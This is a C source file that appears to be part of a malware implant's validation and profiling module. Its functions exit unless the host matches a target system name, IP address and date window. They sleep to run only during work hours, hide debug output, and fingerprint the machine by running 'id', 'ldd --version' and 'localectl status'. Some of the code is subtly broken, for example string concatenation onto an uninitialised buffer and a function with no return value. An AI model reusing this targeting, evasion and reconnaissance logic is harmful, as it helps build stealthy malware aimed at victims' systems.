/*  File: valHelper.c
*   Author: Nunyabeeswax
*   Date: 6/7/2021
*   Description:
*               - Defines the auxilliary functions declared in valHelper.h
*/

#include "valHelper.h"

/* ======== Validating ======= */

void my_perror(char* msg){
    #ifdef DEBUG
        perror(msg);
    #endif
}


void my_printf(char* msg){
    #ifdef DEBUG
        printf(msg);
    #endif
}


void val_SysName(){
    #ifdef VALID_SYSNAME
    struct utsname uts;
    uname(&uts);
    if (strcmp(uts.sysname, VALID_SYSNAME)==0) return;
    else{
        #ifdef DEBUG
            printf("NOT Target System");
        #endif
        exit(EXIT_FAILURE);
    }
    #endif
}

void val_IP(){
    #ifdef VALID_IP
    struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char host[NI_MAXHOST];

    if (getifaddrs(&ifaddr) == -1){
        my_perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    // ifaddr might be a list of interfaces
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next){
        // don't do loop if addr null
        if (ifa->ifa_addr == NULL)
            continue;
        // translate the socket address into a location and service name into the host param
        s=getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
        if((ifa->ifa_addr->sa_family==AF_INET)){ 
            if (s != 0){
                #ifdef DEBUG
                    printf("getnameinfo() failed: %s\n", gai_strerror(s));
                #endif
                exit(EXIT_FAILURE);
            }

            #ifdef DEBUG
                printf("Interface : <%s>\n",ifa->ifa_name );
                printf("Address : <%s>\n", host);
            #endif

            // clear up the mem used by getifaddrs
            freeifaddrs(ifaddr);

            // this the one!
            if (strcmp(host, VALID_IP)==0){
                return;
            }
            // wrong IP!
            else{
                my_perror("Wrong IP!");
                exit(EXIT_FAILURE);
            }
        }
    }
    my_perror("Interface not part of AF_INET Family!");
    exit(EXIT_FAILURE);
    #endif
}


// date struct for val_time
struct date {
 int dd, mm, yy;
};


/* compare given dates. Return 0 if they're equal.
Return 1 if d1 is later than d2. Return -1 if d1 is earlier.*/
int date_cmp(struct date d1, struct date d2) {
 if (d1.dd == d2.dd && d1.mm == d2.mm && d1.yy ==d2.yy)
    return 0;
 else if (d1.yy > d2.yy || d1.yy == d2.yy && d1.mm > d2.mm || 
           d1.yy == d2.yy && d1.mm == d2.mm && d1.dd > d2.dd)
    return 1;
 else return -1;
};


/* print a given date */
 void date_print(struct date d) {
    printf("%02d/%02d/%d\n", d.mm, d.dd, d.yy);
};


void val_time(){
    #ifdef VALID_TIME
    time_t now;
 
    // Obtain current time
    time(&now);
    struct tm *local = localtime(&now);
         
    // get current date
    struct date date_cur = {local->tm_mday, local->tm_mon + 1, local->tm_year + 1900};
    date_print(date_cur);

    char* token;

    // ==== START_DATE PARSING ===
    char start_date[] = {START_DATE};
    char start_month[3];
    char start_day[3];
    char start_year[5];

    token = strtok(start_date, "/");
    memcpy(start_month, token, 2);
    token = strtok(NULL, "/");
    memcpy(start_day, token, 2);
    token = strtok(NULL, "/");
    memcpy(start_year, token, 4);

    struct date date_start = {atoi(start_day), atoi(start_month), atoi(start_year)};
    date_print(date_start);

    // === END_DATE PARSING ===
    token = NULL;
    char end_date[] = {END_DATE};
    char end_month[3];
    char end_day[3];
    char end_year[5];

    token = strtok(end_date, "/");
    memcpy(end_month, token, 2);
    token = strtok(NULL, "/");
    memcpy(end_day, token, 2);
    token = strtok(NULL, "/");
    memcpy(end_year, token, 4);

    struct date date_end = {atoi(end_day), atoi(end_month), atoi(end_year)};
    date_print(date_end);

   /* ===== Checking the Dates =====*/

   int cmp_cur_strt = date_cmp(date_cur, date_start);
   int cmp_cur_end = date_cmp(date_cur, date_end);

    // date >= start_date
    if(cmp_cur_strt == 1 || cmp_cur_strt == 0){
        // date <= end_date
        if(cmp_cur_end == -1 || cmp_cur_end == 0)
            ;// Within dates, move on to check TIME
        // date > end_date
        else{
            //uninstall (should be called in main anyway) and exit
            #ifdef DEBUG
                printf("Past end date. Exiting!");
            #endif
            exit(EXIT_FAILURE);
        }
    }
    // date < start_date
    else{
        // sleep 24 hrs, then checkDate again
        #ifdef DEBUG
            printf("Before start date. Sleeping 24 hrs\n");
        #endif
        sleep(86400);
        val_time();
        return;
    }

    /*
    time >= WORK_START --> check end_time
        time < end_time --> execute
        time >= end_time --> sleep till next day
            call date check again
    */
    int cur_hr = local->tm_hour;

    // after start of work day
    if( cur_hr >= WORK_START){
        // perfect timing!
        if(cur_hr < WORK_END){
            return;
        }
        //sleep 12 hrs till next day
        else{
            #ifdef DEBUG
            printf("After work day. Sleeping 12 hrs\n");
            #endif
            sleep(43200);
            val_time();
            return;
        }
    }
    // before workday
    else{
        // sleep 4 hrs then check again
        #ifdef DEBUG
            printf("Before workday. Sleeping 4 hrs\n");
        #endif
        sleep(14400);
        val_time();
        return;
    }
    #endif
}


/*======== Profiling ======= 
    NOT IMPLEMENTED 
    /resources/misc/profilerDemo.c
    https://stackoverflow.com/questions/4757512/execute-a-linux-command-in-the-c-program
*/

struct Profile* getProfile(){
    struct utsname uts;
    uname(&uts);

    struct Profile* outProf = (struct Profile*) malloc(sizeof(struct Profile));

    outProf->kernel = uts.sysname;
    outProf->kernel_v = uts.version;
    outProf->kernel_rel = uts.release;
    outProf->hardware = uts.machine;
    /// Continue implementing later
}

char* strProfile(){
    struct utsname uts;
    uname(&uts);
    char * giantList = malloc(1024);
    strcat(giantList,uts.sysname);
    strcat(giantList,"\n");

    strcat(giantList,uts.machine);
    strcat(giantList,"\n");

    strcat(giantList,uts.release);
    strcat(giantList,"\n");

    strcat(giantList,uts.version);
    strcat(giantList,"\n");

    FILE *fp;
    char path[1035];

    // (UID or group ID) of ppl in sys
    fp = popen("id", "r");
    fgets(path, sizeof(path), fp);
    strcat(giantList, path);
    //strcat(giantList,"\n");

    //Linux command line utility that is used in case a user wants to know the shared library dependencies of an executable or shared library
    fp = popen("ldd --version", "r");
    fgets(path, sizeof(path), fp); 
    strcat(giantList, path);
    //strcat(giantList,"\n");

    // used to query and change the system locale and keyboard layout settings.
    fp = popen("localectl status", "r");
    fgets(path, sizeof(path), fp);
    strcat(giantList, path);
    //strcat(giantList,"\n");

    /* close */
    pclose(fp);
    return giantList;
}


